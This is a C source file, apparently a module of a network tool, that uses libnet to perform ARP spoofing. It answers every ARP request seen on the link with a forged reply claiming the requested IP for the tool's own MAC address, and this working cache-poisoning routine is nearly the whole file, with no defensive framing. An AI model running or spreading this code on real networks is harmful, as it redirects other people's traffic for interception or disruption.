

#include <stdlib.h>
#include <time.h>

#ifndef _Post_invalid_
    #define _Post_invalid_
#endif
#include <libnet.h>
#include <libnet/libnet-headers.h>

#include "arp_module.h"

struct arp_module_s {
    /// MAC address to perform ARP spoofing (better use network adapter that we use)
    uint8_t hw_addr[ETHER_ADDR_LEN];
    /// Libnet context to work with LIBNET_LINK
    libnet_t *arp_ctx;
};

void on_arp(void *ctx, const struct pcap_pkthdr *h, const u_char *pkt, size_t len) {
    arp_module_t *m = ctx;

    if (m == NULL) {
        return;
    }

    const struct libnet_ethernet_hdr *eth = (struct libnet_ethernet_hdr *)pkt;

    if (memcmp(eth->ether_shost, m->hw_addr, sizeof(m->hw_addr)) == 0) {
        printf("---------------------------\n");
        printf("My own ARP packet, aborting\n");
        printf("---------------------------\n\n");
        return;  // Don't process our own packets
    }

    const struct libnet_arp_hdr *arp =
        (struct libnet_arp_hdr *)(pkt + sizeof(struct libnet_ethernet_hdr));

    uint16_t arp_type = ntohs(arp->ar_op);

    if (arp_type != ARPOP_REQUEST) {
        return;
    }
    printf("----- ARPOP_REQUEST -----\n");

    const uint8_t *arp_data = (const uint8_t *)(arp + 1);
    const uint8_t *arp_sha = arp_data;                                            // Sender MAC
    const uint8_t *arp_spa = arp_data + arp->ar_hln;                              // Sender IP
    const uint8_t *arp_tha = arp_data + arp->ar_hln + arp->ar_pln;                // Target MAC
    const uint8_t *arp_tpa = arp_data + arp->ar_hln + arp->ar_hln + arp->ar_pln;  // Target IP

    /*----------------------------------TEST---------------------------------------------*/

    printf("----- ARPOP_REQUEST -----\n");

    printf("Sender MAC : %02x:%02x:%02x:%02x:%02x:%02x\n", arp_sha[0], arp_sha[1], arp_sha[2],
           arp_sha[3], arp_sha[4], arp_sha[5]);

    printf("Sender IP : %d.%d.%d.%d\n", arp_spa[0], arp_spa[1], arp_spa[2], arp_spa[3]);

    printf("Target MAC : %02x:%02x:%02x:%02x:%02x:%02x (00:00:00:00:00:00)\n", arp_tha[0],
           arp_tha[1], arp_tha[2], arp_tha[3], arp_tha[4], arp_tha[5]);

    printf("Target IP: %d.%d.%d.%d\n", arp_tpa[0], arp_tpa[1], arp_tpa[2], arp_tpa[3]);

    printf("Desired MAC : %02x:%02x:%02x:%02x:%02x:%02x\n", m->hw_addr[0], m->hw_addr[1],
           m->hw_addr[2], m->hw_addr[3], m->hw_addr[4], m->hw_addr[5]);
    printf("--------------------\n\n");
    /*-----------------------------------------------------------------------------------*/
    // Clear libnet context
    libnet_clear_packet(m->arp_ctx);

    libnet_build_arp(ARPHRD_ETHER,    // Hardware type
                     ETHERTYPE_IP,    // Protocol type
                     ETHER_ADDR_LEN,  // Hardware address length
                     4,               // Protocol address length
                     ARPOP_REPLY,     // Operation
                     m->hw_addr,      // Sender hardware address
                     arp_tpa,         // Sender protocol address
                     arp_sha,         // Target hardware address
                     arp_spa,         // Target protocol address
                     NULL,            // Payload
                     0,               // Payload size
                     m->arp_ctx,      // libnet handle
                     0                // libnet id
    );

    libnet_build_ethernet(arp_sha,        // Destination MAC
                          m->hw_addr,     // Source MAC
                          ETHERTYPE_ARP,  // Frame type
                          NULL,           // Payload
                          0,              // Payload size
                          m->arp_ctx,     // libnet handle
                          0               // libnet id
    );

    uint32_t packet_size = libnet_write(m->arp_ctx);
    if (packet_size == -1) {
        fprintf(stderr, "Write error: %s\n", libnet_geterror(m->arp_ctx));
    }

    printf("ARP packet sent successfully (%d bytes)\n\n", packet_size);
}

arp_module_t *arp_module_create(const char *device,
                                const uint8_t hw[ETHER_ADDR_LEN],
                                char *errbuf) {
    arp_module_t *m = calloc(1, sizeof(*m));

    if (!m) {
        free(m);
        return NULL;
    }

    libnet_t *arp_ctx = libnet_init(LIBNET_LINK, device, errbuf);
    if (arp_ctx == NULL) {
        free(m);
        return NULL;
    }

    m->arp_ctx = arp_ctx;

    memmove(m->hw_addr, hw, ETHER_ADDR_LEN);

    return m;
}

void arp_module_destroy(arp_module_t *m) {
    libnet_destroy(m->arp_ctx);
    free(m);
}

#ifdef _Post_invalid_
    #undef _Post_invalid_
#endif
